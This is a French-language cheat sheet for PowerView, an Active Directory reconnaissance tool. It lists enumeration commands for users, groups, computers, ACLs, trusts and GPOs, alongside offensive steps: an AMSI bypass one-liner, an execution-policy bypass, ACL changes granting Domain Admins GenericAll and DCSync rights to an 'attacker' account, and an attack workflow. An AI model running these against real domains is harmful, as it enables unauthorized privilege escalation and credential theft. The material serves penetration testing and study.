# ⚡ PowerView — énumération AD avec PowerShell

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  Reconnaissance Active Directory avec PowerShell
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 Table des matières

- [Qu’est-ce que PowerView ?](#-quest-ce-que-powerview-)
- [Préparation](#-préparation)
- [Énumération du domaine](#-énumération-du-domaine)
- [Énumération des utilisateurs](#-énumération-des-utilisateurs)
- [Énumération des groupes](#-énumération-des-groupes)
- [Énumération des ordinateurs](#-énumération-des-ordinateurs)
- [Énumération des listes de contrôle d’accès (ACL)](#-énumération-des-listes-de-contrôle-daccès-acl)
- [Énumération des relations d’approbation](#-énumération-des-relations-dapprobation)
- [Énumération des objets de stratégie de groupe (GPO)](#-énumération-des-objets-de-stratégie-de-groupe-gpo)
- [Recherche des accès et sessions](#-recherche-des-accès-et-sessions)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce que PowerView ?

**PowerView** est un outil PowerShell d’énumération et d’exploitation d’Active Directory (AD). L’énumération consiste à inventorier les objets et les relations de l’annuaire :

- 🔍 **Énumération** — Utilisateurs, groupes, ordinateurs et GPO
- 🔐 **ACL** — Repérer les permissions mal configurées
- 🌐 **Relations d’approbation (trusts)** — Cartographier les relations entre domaines
- 🎯 **Recherche de sessions (hunting)** — Localiser les machines où les utilisateurs ont ouvert une session

---

## 🚀 Préparation

### Télécharger PowerView

> **Version des exemples :** le dépôt PowerSploit est archivé et n’est plus pris en charge. Fonctions et alias dépendent du fichier utilisé. PowerView et SharpHound sont des outils distincts ; l’affirmation d’inclusion dans BloodHound est historique ([PowerSploit](https://github.com/PowerShellMafia/PowerSploit), [SharpHound CE](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound)).

```powershell
# Depuis PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Depuis SharpHound
# PowerView.ps1 inclus avec BloodHound, selon l’original
```

### Importer le module

> **Précision :** la portée Process ne concerne que la session et une stratégie de groupe peut primer. La stratégie d’exécution n’est pas une frontière de sécurité et ne désactive pas AMSI ([Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)).

```powershell
# Contourner la stratégie d’exécution
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Importer
Import-Module .\PowerView.ps1

# Ou charger le script par dot-sourcing
. .\PowerView.ps1
```

### Contournement AMSI (selon le contexte)

> **Exemple historique :** cette ligne dépend d’un détail interne non public ; son résultat n’est pas garanti selon la version et les protections. Elle reste inchangée. AMSI est une interface d’intégration antimalware, distincte de la stratégie d’exécution ([Microsoft AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)).

```powershell
# Contournement simple
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 🏢 Énumération du domaine

### Informations générales sur le domaine

```powershell
# Obtenir les informations du domaine
Get-Domain

# Obtenir le SID du domaine
Get-DomainSID

# Obtenir la stratégie du domaine
Get-DomainPolicy

# Obtenir les contrôleurs de domaine
Get-DomainController
Get-DomainController -Domain other.domain.local

# Obtenir les informations de la forêt
Get-Forest
Get-ForestDomain
```

### Stratégie du domaine

```powershell
# Stratégie de mots de passe
(Get-DomainPolicy)."SystemAccess"

# Stratégie Kerberos
(Get-DomainPolicy)."KerberosPolicy"
```

---

## 👤 Énumération des utilisateurs

### Lister les utilisateurs

```powershell
# Tous les utilisateurs
Get-DomainUser

# Utilisateur précis
Get-DomainUser -Identity admin

# Propriétés de l’utilisateur
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Utilisateurs ayant une description
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Rechercher des utilisateurs intéressants

> **Précision :** adminCount peut refléter une appartenance administrative passée ; ce n’est pas une preuve de droits actuels. Une description correspondant au filtre est une piste, pas forcément un mot de passe. Un SPN ou une préauthentification désactivée impose aussi de vérifier les conditions Kerberos ([attribut Microsoft](https://learn.microsoft.com/en-us/windows/win32/adschema/a-admincount), [source PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)).

```powershell
# Utilisateurs avec SPN (exposés au Kerberoasting)
Get-DomainUser -SPN

# Utilisateurs sans préauthentification (AS-REP)
Get-DomainUser -PreauthNotRequired

# Utilisateurs avec adminCount (protégés selon l’original)
Get-DomainUser -AdminCount

# Utilisateurs dont la description contient des mots de passe
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### Sessions des utilisateurs

```powershell
# Où l’utilisateur a-t-il ouvert une session ?
Find-DomainUserLocation -UserIdentity admin

# Rechercher les utilisateurs ayant un accès administrateur
Find-LocalAdminAccess
```

---

## 👥 Énumération des groupes

### Lister les groupes

```powershell
# Tous les groupes
Get-DomainGroup

# Groupe précis
Get-DomainGroup -Identity "Domain Admins"

# Membres du groupe
Get-DomainGroupMember -Identity "Domain Admins"

# Membres recherchés récursivement
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Groupes importants

```powershell
# Administrateurs du domaine (Domain Admins)
Get-DomainGroupMember -Identity "Domain Admins"

# Administrateurs de l’entreprise (Enterprise Admins)
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrateurs (Administrators)
Get-DomainGroupMember -Identity "Administrators"

# Rechercher les groupes auxquels appartient l’utilisateur
Get-DomainGroup -UserName admin
```

### Groupes locaux

```powershell
# Administrateurs locaux de la machine
Get-NetLocalGroupMember -ComputerName server01

# Administrateurs locaux sur l’ensemble des machines
Find-DomainLocalGroupMember -GroupName Administrators
```

---

## 💻 Énumération des ordinateurs

### Lister les ordinateurs

```powershell
# Tous les ordinateurs
Get-DomainComputer

# Ordinateur précis
Get-DomainComputer -Identity server01

# Propriétés
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Ordinateurs avec délégation non contrainte
Get-DomainComputer -Unconstrained
```

### Rechercher des cibles

```powershell
# Contrôleurs de domaine
Get-DomainController

# Serveurs
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Ancien système d’exploitation
Get-DomainComputer -OperatingSystem "*2008*"
```

### Partages

> **Correction de l’original :** `-CheckShareAccess` vérifie l’accès en lecture, pas la possibilité d’écrire. Les recherches de partages et sessions peuvent contacter les machines et dépendent des permissions ; ce ne sont pas simplement des lectures locales de l’annuaire ([documentation officielle](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainShare/)).

```powershell
# Rechercher les partages
Find-DomainShare

# Partages modifiables, selon l’original
Find-DomainShare -CheckShareAccess

# Fichiers intéressants dans les partages
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

## 🔐 Énumération des listes de contrôle d’accès (ACL)

Une ACL décrit les permissions ; chaque entrée est une ACE. Un SID identifie une entité de sécurité et un GUID identifie un objet ou un type de droit.

### Consulter une ACL

```powershell
# ACL de l’utilisateur
Get-DomainObjectAcl -Identity admin

# Résoudre les GUID
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Droits précis
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Rechercher des ACL intéressantes

```powershell
# GenericAll sur un utilisateur
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### Droits DCSync

> **Précision :** le filtre repère des ACE candidates, pas automatiquement les droits effectifs de l’utilisateur courant. DCSync suppose notamment GetChanges et GetChangesAll combinés sur le domaine concerné. Modifier une ACL nécessite les autorisations correspondantes ; une entrée isolée ne suffit pas ([SpecterOps](https://bloodhound.specterops.io/resources/edges/dc-sync)).

```powershell
# Rechercher les droits DCSync
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### Modifier une ACL

```powershell
# Ajouter GenericAll pour un utilisateur
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Ajouter les droits DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## 🤝 Énumération des relations d’approbation

### Relations d’approbation entre domaines

```powershell
# Obtenir les relations d’approbation
Get-DomainTrust

# Toutes les relations d’approbation
Get-DomainTrust -Domain domain.local

# Cartographier toutes les relations d’approbation
Get-DomainTrustMapping
```

### Relations d’approbation entre forêts

```powershell
# Relations d’approbation entre forêts
Get-ForestTrust

# Domaines de la forêt
Get-ForestDomain
```

### Types de relations d’approbation

> **Précision :** les directions du tableau sont relatives au domaine depuis lequel on observe la relation ; elles n’impliquent pas à elles seules un accès à toutes les ressources. Le sens doit être interprété avec le domaine de référence ([source PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)).

| Type de relation | Direction | Description |
|------------|-----------|-------------|
| Bidirectionnelle (Bidirectional) | Dans les deux sens | Chaque domaine approuve l’autre |
| Entrante (Inbound) | Un seul sens | L’autre domaine nous approuve |
| Sortante (Outbound) | Un seul sens | Nous approuvons l’autre domaine |

---

## 📜 Énumération des objets de stratégie de groupe (GPO)

Une GPO est un objet de stratégie de groupe ; une OU est une unité d’organisation de l’annuaire.

### Lister les GPO

```powershell
# Toutes les GPO
Get-DomainGPO

# GPO par nom
Get-DomainGPO -Identity "Default Domain Policy"

# GPO sur une OU précise, selon l’original
Get-DomainGPO -ComputerIdentity server01
```

### Rechercher les permissions des GPO

> **Précision :** le filtre ACL ne limite pas les résultats à l’utilisateur courant et ne calcule pas tous ses droits effectifs. `-ComputerIdentity` vise les GPO associées à un ordinateur, malgré le commentaire « OU » précédent ; liaison et application effective d’une stratégie ne sont pas équivalentes ([Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/)).

```powershell
# GPO que l’utilisateur peut modifier, selon l’original
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### Emplacements des GPO

```powershell
# OU auxquelles la GPO s’applique
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO sur un ordinateur précis
Get-DomainGPO -ComputerIdentity "server01"
```

---

## 🎯 Recherche des accès et sessions

### Rechercher les accès administrateur

> **Version des exemples :** `-ComputerFile` ne figure pas dans la syntaxe citée ; les lignes restent celles de l’original. Le fichier PowerView référencé définit `Invoke-UserHunter` et `Get-DomainPolicy` comme alias. `Find-LocalAdminAccess` teste l’accès du contexte courant aux machines. Les résultats de session dépendent des accès et du moment ; le mode Stealth réduit certaines recherches sans garantir l’invisibilité ([accès administrateur](https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/), [sessions](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/), [alias officiels](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)).

```powershell
# Sur quelles machines sommes-nous administrateur local ?
Find-LocalAdminAccess

# Avec plusieurs fils d’exécution
Find-LocalAdminAccess -Threads 10

# Sur des ordinateurs précis
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Localiser des utilisateurs

```powershell
# Où l’utilisateur a-t-il ouvert une session ?
Find-DomainUserLocation

# Utilisateur précis
Find-DomainUserLocation -UserIdentity admin

# Seulement les ordinateurs auxquels nous avons accès
Find-DomainUserLocation -CheckAccess
```

### Rechercher des sessions

```powershell
# Sessions sur la machine
Get-NetSession -ComputerName dc01

# Utilisateurs connectés
Get-NetLoggedon -ComputerName server01

# Sessions RDP
Get-NetRDPSession -ComputerName server01
```

### Rechercher des utilisateurs précis

```powershell
# Rechercher les administrateurs du domaine
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Vérifier où ils ont ouvert une session
Invoke-UserHunter

# Mode discret
Invoke-UserHunter -Stealth
```

---

## 📊 Référence rapide

### Commandes essentielles

| Commande | Description |
|---------|-------------|
| `Get-Domain` | Informations sur le domaine |
| `Get-DomainUser` | Lister les utilisateurs |
| `Get-DomainGroup` | Lister les groupes |
| `Get-DomainComputer` | Lister les ordinateurs |
| `Get-DomainController` | Lister les contrôleurs de domaine |
| `Get-DomainTrust` | Lister les relations d’approbation |
| `Get-DomainGPO` | Lister les GPO |
| `Find-LocalAdminAccess` | Rechercher les accès administrateur |
| `Find-DomainUserLocation` | Rechercher les sessions des utilisateurs |

### Cibles Kerberos

Un SPN est un nom principal de service. Le Kerberoasting et l’AS-REP roasting permettent de tester des mots de passe hors ligne à partir d’échanges Kerberos, sous les conditions propres à chaque mécanisme.

| Commande | Description |
|---------|-------------|
| `Get-DomainUser -SPN` | Comptes exposés au Kerberoasting |
| `Get-DomainUser -PreauthNotRequired` | Comptes exposés à l’AS-REP roasting |
| `Get-DomainComputer -Unconstrained` | Délégation non contrainte |

### Filtres courants

```powershell
# Filtrer par propriété
Get-DomainUser -Properties samaccountname,description

# Filtre LDAP
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Clause de filtrage Where
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Déroulement d’une attaque

```powershell
# 1. Importer
Import-Module .\PowerView.ps1

# 2. Énumérer le domaine
Get-Domain
Get-DomainController

# 3. Rechercher les utilisateurs
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Rechercher les accès administrateur
Find-LocalAdminAccess

# 5. Localiser les utilisateurs
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Examiner les ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Ressources

- [PowerView sur GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Blog de HarmJ0y](https://blog.harmj0y.net/)
- [Aide-mémoire PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Aide-mémoire associés
- [BloodHound](../../BloodHound/translations/README.fr.md)
- [PowerShell](../../PowerShell/translations/README.fr.md)
- [Mimikatz](../../Mimikatz/translations/README.fr.md)

---

<p align="center">
  <b>⚡ Reconnaissance AD avec PowerShell !</b><br>
  <i>PowerView — un outil historique d’énumération Active Directory</i>
</p>
